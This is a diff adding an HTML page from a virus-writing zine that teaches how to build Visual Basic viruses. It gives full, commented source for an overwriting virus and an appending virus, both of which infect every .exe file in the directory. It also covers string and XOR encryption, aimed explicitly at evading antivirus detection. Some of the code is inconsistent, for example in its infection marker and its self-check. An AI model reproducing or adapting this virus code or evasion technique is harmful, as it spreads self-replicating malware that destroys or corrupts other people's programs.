@@ -1,0 +1,508 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - VB Virus Tutorial</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<blockquote> 
+  <P align="center"> <font color="#004080" size="+3"><b>VB Virus Tutorial<br>
+    <font size="+1">by [PAIN]<br>
+    for LineZero Zine #2</font></b></font></P>
+  <hr>
+  <P align="center"><b>Part #1<br>
+    Intro to VB viruses </b> </P>
+  <P> Many of you people out there will stop reading this article just by the 
+    title of it. Most asm coders are really prejudiced against High Level Language 
+    viruses and especially Visual Basic ones. Here I guess I would have to greet 
+    Murkry for writting the first ever parasitic VB virus. After that I learned 
+    many stuff and used some methods of my own which I will teach you through 
+    this series of tutorials. </P>
+  <P> The only reason why I even started writting VB viruses was that I was a 
+    macro coder and I wanted to try exe infection. This was my first contact with 
+    exe infection. VB viruses have one b i g flow. That is their size. As you 
+    all know they are big and that is something we don't want in a virus is it? 
+    To solve this problem we could use variables for oftenly used string to shorten 
+    the code but that isn't much help so we have to accept the size as a flow 
+    and try to find many tricks to make it as hard to detect as possible. Another 
+    problem of VB viruses is that they need dlls to run(!) not a thing we want 
+    for a virus. Besides this is why I started learning asm. VB viruses are for 
+    educational purposes only. </P>
+  <P> You can use encryption for VB viruses as well. I have used character encryption 
+    ( used in macro viruses, first used by VicodinES ) and it worked succesfully. 
+    Now I am trying to find other methods of encryption especially for VB viruses 
+    and you will see the results in later issues of this series. </P>
+  <P> For any comments and/or suggestions e-mail me at [PAiN]@cypria.com </P>
+  <P> From [PAiN] (formally known as PhreakX). </P>
+  <P align="center"> <b>part #2<br>
+    EXE Overwritters </b></P>
+  <P> I know that overwritters suck, they have no chance of spreading and they 
+    are not " intelligent " viruses. Dispite all this overwritters can help you 
+    understand the basics of the REAL viruses. I will give you the code first 
+    and then I will go over it. </P>
+  <PRE>
+ Option Explicit
+ Dim myarray() As Byte
+ Dim victim As String
+ Const mysize As Integer = 11776
+
+ Private Sub Form_Load()
+ On Error Resume Next
+ Dim Free
+ Free = FreeFile
+
+ Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #Free
+ ReDim myarray(mysize)
+ Get #1, 1, myarray
+ Close #Free
+
+ victim = Dir(App.Path & "\" & "*.EXE")
+ While victim &lt;&gt; ""
+
+ Open App.Path & "\" & victim For Binary Access Write As #Free
+ Put #1, , myarray
+ Put #1, , mysize
+ Close #Free
+
+ victim = Dir()
+
+ Wend
+
+ End
+ End Sub
+</PRE>
+  <P> Now lets go over it part by part: </P>
+  <PRE>
+ Option Explicit
+ Dim myarray() As Byte
+ Dim victim As String
+ Const mysize As Integer = 11776
+</PRE>
+  <P> Here we define the variables that we will use, the " myarray() " variable 
+    holds tha binary code of the virus, the "victim" variable holds the victim 
+    file's name and the "mysize" variable holds the size of the virus. </P>
+  <PRE>
+ Private Sub Form_Load()
+ On Error Resume Next
+</PRE>
+  <P> We open the sub we will use (Form_Load), and we put our error handle there. 
+  </P>
+  <PRE>
+ Dim Free
+ Free = FreeFile
+</PRE>
+  <P> This is a good idea taken by the y2k virus. This will rid you of read/write 
+    errors because it will open free file. </P>
+  <PRE>
+ Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #Free
+ ReDim myarray(mysize)
+ Get #1, 1, myarray
+ Close #Free
+</PRE>
+  <P> Now we get the binary code out of our virus and we store it in the "myarray" 
+    variable. </P>
+  <PRE>
+ victim = Dir(App.Path & "\" & "*.EXE")
+ While victim &lt;&gt; ""
+
+ Open App.Path & "\" & victim For Binary Access Write As #Free
+ Put #1, , myarray
+ Put #1, , mysize
+ Close #Free
+</PRE>
+  <P> Here we define the victim variable and we put our binary code in the victim 
+    program. </P>
+  <PRE>
+ victim = Dir()
+
+ Wend
+</PRE>
+  <P> Then we set victim to nothing, and we repeat the whole process to infect 
+    all the .exe files in the current directory. </P>
+  <PRE>
+ End
+ End Sub
+</PRE>
+  <P> And finally we close the program and the sub. </P>
+  <P> This was it ... as you can see overwritters are dead easy to write. In the 
+    next issue I will discuss appending viruses. For comments and/or questions 
+    e-mail me at [PAiN]@cypria.com </P>
+  <P> From [PAiN] (formally known as PhreakX). </P>
+  <P align="center"> <b>part #3<br>
+    EXE Appenders </b></P>
+  <P> Now we get to the real thing... the EXE appending viruses. This is a simple 
+    not encrypted appending virus without any payload. </P>
+  <PRE>
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-Cut here-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Option Explicit
+Private victim As String
+Private myarray() As Byte
+Private varray As Byte
+Private length As Long
+Private chck As String
+
+Const size As Integer = 18432 
+
+Private iResult As Long
+Private hProg As Long
+Private idProg As Long
+Private iExit As Long
+Const STILL_ACTIVE As Long = &H103
+Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
+
+Private Declare Function OpenProcess Lib "kernel32" _
+ (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, _
+ ByVal dwProcessId As Long) As Long
+Private Declare Function GetExitCodeProcess Lib "kernel32" _
+ (ByVal hProcess As Long, lpExitCode As Long) As Long
+Private Declare Function CloseHandle Lib "kernel32" _
+ (ByVal hObject As Long) As Long
+
+Private Sub Form_Load()
+
+On Error Resume Next
+
+Dim I As Long
+Dim Free
+Free = FreeFile
+    
+On Error GoTo Fin 
+
+Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #Free
+myarray = Space$(size)
+Get #1, 1, myarray
+Close #Free
+        
+victim = Dir(App.Path & "\" & "*.EXE")
+While victim &lt;&gt; ""
+          
+' If the victim file, has the same directory and name as the file
+' that is running - skip the next part
+If LCase(App.Path & "\" & App.EXEName & ".exe") _
+ &lt;&gt; LCase(App.Path & "\" & App.EXEName & ".exe") Then
+                
+Open Victim For Binary Access Read As #Free
+varray = Space(LOF(Free)) ' Sets buffer up for the file data
+Get #1, 1, varray         ' Copy th file data into a variable
+Close #Free
+                
+chck = Mid(varray, Len(varray)) ' Store the last character in the
+                                ' victim file in CheckX
+                
+If LCase(chck) &lt;&gt; "^" Then      ' if the character = X then the file has
+                                ' already been infected, if not continue
+                                                    
+Open victim For Binary Access Write As #Free
+Put #Free, 1, myarray      ' Place our code in the front of the file
+Put #Free, size, varray    ' Follow it immediatley by the victims code
+Put #Free, LOF(Free) + 1, "^" 'Place an X at the end to show it's been
+                              'infected
+Close #Free                   'Thats how this virus got it's name!
+    
+End If
+Else
+End If
+
+Victim = Dir()              ' Find the next file to infect
+Wend                        ' Go back to the start
+
+Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #Free
+length = (LOF(Free) - size)  ' Store the length of the current file minus
+                             ' the virus file size in the variable
+If Length &gt; 0 Then           ' if it's more than 0, the file is infected,
+                             ' if not, this is the raw virus file
+myarray = Space(length)      ' Create buffer in variable, for the size of
+                             ' the file
+Get #Free, size, myarray     ' Get the old host data from out of this file
+Close #Free
+    
+Open App.Path & "\" & App.EXEName & ".tut" For Binary Access Write As #Free
+Put #Free, , myarray        ' Place the old host data into a temporary file
+Close #Free
+        
+idProg = Shell(App.Path & "\" & App.EXEName & ".tut", vbNormalFocus) 
+' Run the old host code
+hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)   
+' Get it running application code number
+GetExitCodeProcess hProg, iExit
+
+Do While iExit = STILL_ACTIVE   ' Wait untill the program is shut down
+DoEvents
+GetExitCodeProcess hProg, iExit
+Loop
+On Error Resume Next
+Kill App.Path & "\" & App.EXEName & ".tut"  ' Delete the old host code
+
+Else
+Close #Free
+End If
+End
+Fin:
+End Sub
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-Cut here-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</PRE>
+  <P> Now lets go over it part by part: </P>
+  <PRE>
+ Option Explicit
+ Private victim As String
+ Private myrray() As Byte
+ Private varray As Byte
+ Private length As Long
+ Private chck As String
+ Const size As Integer = 18432 
+</PRE>
+  <P> Here we define the variables that we will use, the " myarray() " variable 
+    holds tha binary code of the virus, the "victim" variable holds the victim 
+    file's name and the "mysize" variable holds the size of the virus. You will 
+    need to change the number to the size of your virus. The length variable holds 
+    the running file's length and the chck variable will be used to check if we 
+    have already infected the file. </P>
+  <PRE>
+ Private iResult As Long
+ Private hProg As Long
+ Private idProg As Long
+ Private iExit As Long
+ Const STILL_ACTIVE As Long = &H103
+ Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
+ Private Declare Function OpenProcess Lib "kernel32" _
+  (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, _
+  ByVal dwProcessId As Long) As Long
+ Private Declare Function GetExitCodeProcess Lib "kernel32" _
+  (ByVal hProcess As Long, lpExitCode As Long) As Long
+ Private Declare Function CloseHandle Lib "kernel32" _
+  (ByVal hObject As Long) As Long
+</PRE>
+  <P> These are the variables, constants and declarations that we will use for 
+    process checking. </P>
+  <PRE>
+ Private Sub Form_Load()
+ On Error Resume Next
+</PRE>
+  <P> We open the sub we will use (Form_Load), and we put our error handle there. 
+  </P>
+  <PRE>
+ Dim Free
+ Free = FreeFile
+</PRE>
+  <P> This is a good idea taken by the y2k virus. This will rid you of read/write 
+    errors because it will open free file. </P>
+  <PRE>
+ On Error GoTo Fin
+</PRE>
+  <P> This is our error handler. If there is an error it will ignore all code 
+    and go to the Fin marker which is the end. </P>
+  <PRE>
+ Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #Free
+ myarray = Space$(size)
+ Get #1, 1, myarray
+ Close #Free
+</PRE>
+  <P> Now we get the binary code out of our virus and we store it in " myarray 
+    " variable. </P>
+  <PRE>
+ victim = Dir(App.Path & "\" & "*.EXE")
+ While victim &lt;&gt; ""
+          
+ If LCase(App.Path & "\" & App.EXEName & ".exe") _
+  &lt;&gt; LCase(App.Path & "\" & App.EXEName & ".exe") Then
+</PRE>
+  <P> If our victim file is the same as the one running, same directory and same 
+    name, we do not infect. </P>
+  <PRE>                
+ Open Victim For Binary Access Read As #Free
+ varray = Space(LOF(Free))
+ Get #1, 1, varray
+ Close #Free
+</PRE>
+  <P> We get the binary code from our victim file and store it in the varray variable. 
+  </P>
+  <PRE>   
+ chck = Mid(varray, Len(varray))
+</PRE>
+  <P> We store the last character of the victim file in the chck variable for 
+    later use of infection checking. </P>
+  <PRE>
+ If LCase(chck) &lt;&gt; "t" Then
+</PRE>
+  <P> If the last character isn't " t " then it means that its not infected so 
+    continue. </P>
+  <PRE>                                                  
+ Open victim For Binary Access Write As #Free
+ Put #Free, 1, myarray
+ Put #Free, size, varray
+ Put #Free, LOF(Free) + 1, "t"
+ Close #Free
+
+ End If
+ Else
+ End If
+</PRE>
+  <P> Now we write our virus code first and then the original file code in the 
+    file and we also include the "t" character to mark it as infected. </P>
+  <PRE>
+ Victim = Dir()
+ Wend
+</PRE>
+  <P> This find the next file to infect and redoes the whole routine. </P>
+  <PRE>
+ Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #Free
+ length = (LOF(Free) - size)
+ If Length &gt; 0 Then
+ myarray = Space(length)
+ Get #Free, size, myarray
+ Close #Free
+</PRE>
+  <P> Now we get the file's size minus the virus, if it isn't 0 it means that 
+    it is infected. </P>
+  <PRE>
+ Open App.Path & "\" & App.EXEName & ".tut" _
+  For Binary Access Write As #Free
+ Put #Free, , myarray ' Place the old host data into a temporary file
+ Close #Free
+</PRE>
+  <P> We put the host data in a file we make. A temporary file. </P>
+  <PRE>
+ idProg = Shell(App.Path & "\" & App.EXEName & ".tut", vbNormalFocus)
+ hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)
+ GetExitCodeProcess hProg, iExit
+</PRE>
+  <P> Now we run the original host program. </P>
+  <PRE>
+ Do While iExit = STILL_ACTIVE   ' Wait untill the program is shut down
+ DoEvents
+ GetExitCodeProcess hProg, iExit
+Loop
+</PRE>
+  <P> Wait for the program to be terminated. </P>
+  <PRE>
+ On Error Resume Next
+ Kill App.Path & "\" & App.EXEName & ".tut"  ' Delete the old host code
+
+ Else
+
+ End If
+
+ End
+
+ Fin:
+
+ End Sub
+</PRE>
+  <P> Now we delete the temporary file and then we close our sub. </P>
+  <P> For any comments and / or suggestions, even if it is bad e - mail me at 
+    [PAiN]@cypria.com. </P>
+  <P> From [PAiN] (formally known as PhreakX). </P>
+  <P align="center"> <b>part #4<br>
+    Encryption </b></P>
+  <P align="center"><font color="#FF0000"><b>(NOTE by Cicatrix:"Some of the code 
+    below was written in ASCII and does not translate to HTML correctly. Please 
+    refer to the LZO #2 zine for the correct version&quot;) </b></font></P>
+  <P> Now we get to a more interesting part of vb viruses, better for all viruses 
+    the encryption. You really don't want to make it easy for the AVs do you?? 
+    Here is where you will use encryption. </P>
+  <P> Currently I have only tried two kinds of encryption for vb viruses and they 
+    both work finely. </P>
+  <P> The first one is probably known to all macro coders, its character encryption, 
+    first used by VicodinES. This is easy to use and you can hide your text strings 
+    finely. </P>
+  <P> example of use: </P>
+  <P> Lets say that you have they payload of a messagebox: </P>
+  <P> MsgBox "This is my virus" </P>
+  <P> Now this text string is easier to spot than something like: </P>
+  <P> MsgBox Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(105) + _ 
+    + Chr(115) + Chr(32) + Chr(109) + Chr(121) + Chr(32) + Chr(118) + _ + Chr(105) 
+    + Chr(114) + Chr(117) + Chr(115) </P>
+  <P> A common mistake people make when they use this is that they put the Chr's 
+    in speachmarks ("") and they get a messagebox containing Chr(84) + Chr(104) 
+    + Chr(105) + Chr(115) + Chr(32) + Chr(105) + Chr(115) + Chr(32) + Chr(109) 
+    + Chr(121) + Chr(32) + Chr(118) + Chr(105) + Chr(114) + Chr(117) + Chr(115) 
+    instead of, 'This is a virus.' </P>
+  <P> A good application you can use to quickly encrypt your text strings is by 
+    using VicodinES's string converter. </P>
+  <P> Now a more advanced encryption method is Xor encryption. This encryption 
+    function was written by jackie (http://coderz.net/jackie/). In order to use 
+    this encryption method you have to enter this function in your code: </P>
+  <PRE>
+ Private Function Decrypt_Encrypt(Text) As String
+  XorKey = 133
+  For EncryptDecryptLoop = 1 To Len(Text)
+   Decrypt_Encrypt = Decrypt_Encrypt _
+    & Chr(Asc(Mid(Text, EncryptDecryptLoop, 1)) Xor XorKey)
+  Next
+ End Function
+</PRE>
+  <P> Now to go back to our example with the messagebox:<br>
+    MsgBox "This is a virus" will become,<br>
+    MsgBox Decrypt_Encrypt("A?tä·tä·ö·átlâä") </P>
+  <P> As you can see a call to decrypt your code would be Decrypt_Encrypt<br>
+    Another example of use would be:</P>
+  <pre> Print #1, Decrypt_Encrypt("ßnuur·rrluó") </pre>
+  <P> You can use it everywhere there are text strings. Also the Xor key can be 
+    whatever number between 0 - 255 you want it to be. In the function here I 
+    took it to be 133 but in my text strings I used another XorKey because its 
+    just an example. </P>
+  <P> A good program you could use to encrypt your strings is VB Crypt written 
+    by me. You can get it with the Lz0NT zine #2 with these articles. </P>
+  <P> For any good/bad comments/suggestions e-mail me at [PAiN]@cypria.com. </P>
+  <P> From [PAiN] with little help of jackie </P>
+  <P align="center"> <b>Part #5<br>
+    Credits/Greetz </b></P>
+  <P> Here are the people which inspired me and help me in writting these tutorials 
+    directly or indirectly. </P>
+  <PRE>
+---------------------------------------------------------------------------
+				Credits
+---------------------------------------------------------------------------
+
+Murkry............. For writting the first ever parasitic VB virus
+jackie............. For the Xor encryption function and all his help
+the y2k author..... I don't know  you but your virus had some good ideas in
+                    it which I used in  mine and I want to give  you credit
+                    for them.
+
+-----------------------------------------------------------------------------
+				Greetz
+-----------------------------------------------------------------------------
+
+These names are in no specific order. I am sorry if I forgot anyone but I'm
+only human.
+
+Flitnic............ For being a friend and being there for me whenever I
+                    needed him.
+jackie............. For all the help and support.
+[PaX].............. For being a great buddy.
+[Clau]............. For the help in my first days when I couldn't code
+                    anything.
+Lord Arz........... For helping me with my word macro viruses.
+Evul............... For being next to me.
+Rhape79............ For accepting me into Ultimate Chaos even though I left
+                    after some time. Thanks.
+Ruzz............... For being such a good friend.
+Roadkill........... For all the virus collecting help.
+RAiD............... For being my motivation into virus writting. A HLL
+                    coder who is afraid of nothing and leaves chaos behind
+                    him.
+Gigabyte........... For not killing me even though I give her a hard time=)
+BSL4............... For helping me with hacking.
+Ph0tek............. For trying to teach me how to hack.
+Yozak.............. For being a friend and a great helper with my early 		    
+viruses.
+DCHacker........... For being a friend and for the RedHat cd =)
+The_Might.......... A good friend
+SiLVieR............ Who knows better football?? =)
+VaMpGaL............ For being a good friend.
+darkman............ For being a perverted little buddy
+DX100h............. For your asm tutorials.
+Tally.............. For being a really good friend
+[Manu]............. For the good advices
+Spyda.............. For all the help
+Kamaileon.......... For being a friend
+Reverant........... Thank you for the modivation in starting with asm
+Veedee............. Your asm tuts are the best out there, write some more,
+		    and thanks for the access in #vir.
+To the whole VX scene... keep codin
+To everybody I forgot or couldn't fit here. =)) I luv you all	</PRE>
+</blockquote>
+<hr>
+</BODY>
+</HTML>
